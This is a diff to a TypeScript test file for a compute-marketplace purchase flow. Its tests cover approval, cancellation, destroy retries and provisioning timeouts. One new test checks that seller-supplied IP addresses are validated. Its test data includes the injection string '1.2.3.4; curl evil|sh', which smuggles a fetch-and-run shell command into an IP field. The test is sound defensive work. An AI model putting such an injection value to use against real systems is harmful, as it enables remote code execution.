@@ -42,6 +42,8 @@ type Setup = {
   noPayer?: boolean;
   wrap?: (f: typeof fetch) => typeof fetch;
   spotFeed?: () => Promise<Offer[]>;
+  probePort?: (ip: string) => Promise<boolean>;
+  activeAfterSec?: number;
 };
 
 function setup(o: Setup = {}) {
@@ -54,7 +56,7 @@ function setup(o: Setup = {}) {
   const processor = new FakeProcessor(market === "real" ? { network: NETWORKS.real.caip2, asset: NETWORKS.real.usdc } : {});
   processors.push(processor);
   const config: SellerConfig = market === "real" ? { ...SELLERS.test, market: "real" } : SELLERS.test;
-  const seller = new TestSeller({ processor, resourceUrl: `${config.baseUrl}/compute/provision`, now });
+  const seller = new TestSeller({ processor, resourceUrl: `${config.baseUrl}/compute/provision`, now, activeAfterSec: o.activeAfterSec });
   seller.faults = { ...NO_FAULTS, ...o.faults };
   const payer = fakePayer();
   payers.push(payer);
@@ -81,6 +83,7 @@ function setup(o: Setup = {}) {
     sleep,
     newCode: () => `code-${++codes}`,
     onRecord: (r) => records.push(r),
+    probePort: o.probePort,
   };
   const run = new MarketRun(deps);
   const events = () => journal.all().map((e) => e.event);
@@ -235,7 +238,7 @@ describe("MarketRun approval", () => {
     expect(run.cancel()).toMatchObject({ ok: false });
     expect(payer.calls).toBe(0);
     expect(events()).toEqual([]);
-    expect(records).toEqual([expect.objectContaining({ outcome: "refused", reason: expect.stringContaining("CANCELLED") })]);
+    expect(records).toEqual([expect.objectContaining({ outcome: "refused", reason: expect.stringContaining("CANCELLED"), plan: "vc2-1c-1gb", region: "ewr" })]);
   });
 
   it("cancel at ready is refused", async () => {
@@ -446,6 +449,58 @@ describe("MarketRun never pays twice", () => {
   });
 });
 
+/** Rewrites every instance's ip_address the seller sends back. */
+const rewriteIp = (ip: string) => (f: typeof fetch) =>
+  (async (input: RequestInfo | URL, init?: RequestInit) => {
+    const r = await f(input, init);
+    const url = String(input instanceof Request ? input.url : input);
+    if (!/\/compute\/(instances|provision)/.test(url)) return r;
+    const text = await r.text();
+    let body: Record<string, unknown>;
+    try {
+      body = JSON.parse(text);
+    } catch {
+      return new Response(text, { status: r.status, headers: r.headers });
+    }
+    const fix = (m: unknown) => {
+      if (m && typeof m === "object" && (m as { status?: string }).status === "active") (m as { ip_address: string }).ip_address = ip;
+    };
+    fix(body.instance);
+    fix(body.order);
+    if (Array.isArray(body.instances)) body.instances.forEach(fix);
+    return new Response(JSON.stringify(body), { status: r.status, headers: r.headers });
+  }) as typeof fetch;
+
+describe("MarketRun seller-supplied IP", () => {
+  for (const bad of ["1.2.3.4; curl evil|sh", "example.com"]) {
+    it(`treats ${JSON.stringify(bad)} as no IP: never in the ssh line, never probed, times out`, async () => {
+      const probePort = vi.fn(async () => true);
+      const { run } = setup({ wrap: rewriteIp(bad), probePort });
+      await run.start();
+      await run.done;
+      const v = run.view();
+      expect(v.phase).toBe("failed");
+      expect(v.error).toContain("did not become active");
+      expect(v.machine).toMatchObject({ ip: null, ssh: null, status: "active" });
+      expect(JSON.stringify(v)).not.toContain(bad);
+      expect(probePort).not.toHaveBeenCalled();
+      await run.destroy(); // clears the armed retry
+      expect(run.view().phase).toBe("released");
+    });
+  }
+
+  it("probes a valid routable IP and puts it in the ssh line", async () => {
+    const probePort = vi.fn(async () => true);
+    const { run } = setup({ wrap: rewriteIp("198.51.100.7"), probePort });
+    await run.start();
+    const v = run.view();
+    expect(v.phase).toBe("ready");
+    expect(probePort).toHaveBeenCalledWith("198.51.100.7");
+    expect(v.machine).toMatchObject({ ip: "198.51.100.7", port22: "open" });
+    expect(v.machine?.ssh).toMatch(/ root@198\.51\.100\.7$/);
+  });
+});
+
 describe("MarketRun destroy", () => {
   it("destroy releases the machine and journals released; a second destroy is a no-op", async () => {
     const { run, seller, events } = setup();
@@ -481,12 +536,19 @@ describe("MarketRun destroy", () => {
     expect(events().at(-1)).toBe("released");
   });
 
-  it("destroy asked for while paying destroys the machine as soon as it is known", async () => {
-    const { run, seller, events, records } = setup({ ask: true });
+  it("destroy asked for while the paid request is in flight destroys the machine as soon as it is known", async () => {
+    let target: MarketRun | null = null;
+    const wrap = (f: typeof fetch) =>
+      (async (input: RequestInfo | URL, init?: RequestInit) => {
+        if (new Headers(init?.headers).has("PAYMENT-SIGNATURE")) {
+          expect(target!.view().phase).toBe("paying");
+          void target!.destroy();
+        }
+        return f(input, init);
+      }) as typeof fetch;
+    const { run, seller, events, records } = setup({ wrap });
+    target = run;
     await run.start();
-    expect(run.approve("code-1")).toEqual({ ok: true });
-    expect(run.view().phase).toBe("paying");
-    await run.destroy();
     await run.done;
     expect(run.view().phase).toBe("released");
     expect([...seller.machines.values()].every((m) => m.destroyed)).toBe(true);
@@ -494,12 +556,147 @@ describe("MarketRun destroy", () => {
     expect(records).toEqual([expect.objectContaining({ outcome: "accepted" })]);
   });
 
-  it("destroy before any machine exists is a no-op", async () => {
-    const { run, events } = setup({ ask: true });
+  it("destroy at the approval stop behaves like cancel", async () => {
+    const { run, events, payer, records } = setup({ ask: true });
     await run.start();
     await run.destroy();
-    expect(run.view().phase).toBe("approval");
+    await run.done;
+    expect(run.view().phase).toBe("refused");
+    expect(run.view().refusal?.code).toBe("CANCELLED");
     expect(events()).toEqual([]);
+    expect(payer.calls).toBe(0);
+    expect(records).toEqual([expect.objectContaining({ outcome: "refused", plan: "vc2-1c-1gb", region: "ewr" })]);
+  });
+
+  it("destroy after approve but before the intent stops the run with nothing paid", async () => {
+    const { run, events, payer, records } = setup({ ask: true });
+    await run.start();
+    expect(run.approve("code-1")).toEqual({ ok: true });
+    await run.destroy();
+    await run.done;
+    expect(run.view().phase).toBe("refused");
+    expect(run.view().refusal?.code).toBe("STOPPED");
+    expect(events()).toEqual([]);
+    expect(payer.calls).toBe(0);
+    expect(records).toHaveLength(1);
+  });
+
+  it("destroy during a not-charged attempt stops the run instead of buying a fallback", async () => {
+    const { run, seller, events, payer, records, processor } = setup({ ask: true });
+    await run.start();
+    seller.faults = { ...seller.faults, outOfStockRegions: ["ewr"] };
+    let target: MarketRun | null = null;
+    const handle = seller.handle.bind(seller);
+    seller.handle = async (req: Request) => {
+      // the fresh 402 for the approved quote: the owner presses destroy while it is in flight
+      if (req.method === "POST" && !req.headers.has("PAYMENT-SIGNATURE") && target) void target.destroy();
+      return handle(req);
+    };
+    expect(run.approve("code-1")).toEqual({ ok: true });
+    target = run;
+    await run.done;
+    expect(run.view().phase).toBe("refused");
+    expect(run.view().refusal?.code).toBe("STOPPED");
+    expect(run.view().approval?.code).toBe("code-1"); // no new approval stop
+    expect(events()).toEqual(["intent", "failed"]);
+    expect(payer.calls).toBe(0);
+    expect(processor.settled).toBe(0);
+    expect(records).toEqual([expect.objectContaining({ outcome: "refused", reason: expect.stringContaining("STOPPED") })]);
+  });
+
+  it("destroy during scanning stops the run before any payment", async () => {
+    const { run, events, payer, records } = setup();
+    const started = run.start();
+    await run.destroy();
+    await started;
+    await run.done;
+    expect(run.view().phase).toBe("refused");
+    expect(run.view().refusal?.code).toBe("STOPPED");
+    expect(run.view().attempts).toEqual([]);
+    expect(events()).toEqual([]);
+    expect(payer.calls).toBe(0);
+    expect(records).toHaveLength(1);
+  });
+
+  it("destroy during quoting stops the run before any payment", async () => {
+    let target: MarketRun | null = null;
+    const wrap = (f: typeof fetch) =>
+      (async (input: RequestInfo | URL, init?: RequestInit) => {
+        if (init?.method === "POST" && target) {
+          expect(target.view().phase).toBe("quoting");
+          void target.destroy();
+        }
+        return f(input, init);
+      }) as typeof fetch;
+    const { run, events, payer } = setup({ wrap });
+    target = run;
+    await run.start();
+    await run.done;
+    expect(run.view().phase).toBe("refused");
+    expect(run.view().refusal?.code).toBe("STOPPED");
+    expect(run.view().attempts.length).toBeLessThanOrEqual(1);
+    expect(events()).toEqual([]);
+    expect(payer.calls).toBe(0);
+  });
+
+  it("a failed destroy is retried every 60 s, at most 10 times, and never after it succeeds", async () => {
+    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+    let deletes = 0;
+    let failUntil = Infinity;
+    const wrap = (f: typeof fetch) =>
+      (async (input: RequestInfo | URL, init?: RequestInit) => {
+        if (init?.method === "DELETE" && ++deletes <= failUntil) return new Response("nope", { status: 500 });
+        return f(input, init);
+      }) as typeof fetch;
+    const { run } = setup({ wrap });
+    await run.start();
+    await run.destroy();
+    expect(deletes).toBe(1);
+    await vi.advanceTimersByTimeAsync(60_000);
+    expect(deletes).toBe(2);
+    await vi.advanceTimersByTimeAsync(20 * 60_000);
+    expect(deletes).toBe(11); // the first try plus 10 retries
+    expect(vi.getTimerCount()).toBe(0);
+    expect(run.view().phase).toBe("ready");
+
+    failUntil = 0;
+    await run.destroy();
+    expect(run.view().phase).toBe("released");
+    expect(vi.getTimerCount()).toBe(0);
+  });
+
+  it("a retry that succeeds stops the retries", async () => {
+    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+    let deletes = 0;
+    const wrap = (f: typeof fetch) =>
+      (async (input: RequestInfo | URL, init?: RequestInit) => {
+        if (init?.method === "DELETE" && ++deletes <= 2) return new Response("nope", { status: 500 });
+        return f(input, init);
+      }) as typeof fetch;
+    const { run, events } = setup({ wrap });
+    await run.start();
+    await run.destroy();
+    await vi.advanceTimersByTimeAsync(2 * 60_000);
+    expect(run.view().phase).toBe("released");
+    expect(vi.getTimerCount()).toBe(0);
+    await vi.advanceTimersByTimeAsync(10 * 60_000);
+    expect(deletes).toBe(3);
+    expect(events().filter((e) => e === "released")).toHaveLength(1);
+  });
+
+  it("a provisioning timeout arms a destroy retry for the paid machine", async () => {
+    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+    const { run, seller, events } = setup({ activeAfterSec: 1e9 });
+    await run.start();
+    await run.done;
+    expect(run.view().phase).toBe("failed");
+    expect(run.view().error).toContain("did not become active");
+    const id = run.view().machine!.id;
+    expect(vi.getTimerCount()).toBe(1);
+    await vi.advanceTimersByTimeAsync(60_000);
+    expect(run.view().phase).toBe("released");
+    expect(seller.machines.get(id)?.destroyed).toBe(true);
+    expect(events()).toEqual(["intent", "paid", "released"]);
   });
 
   it("auto-destroy fires at destroyAt", async () => {
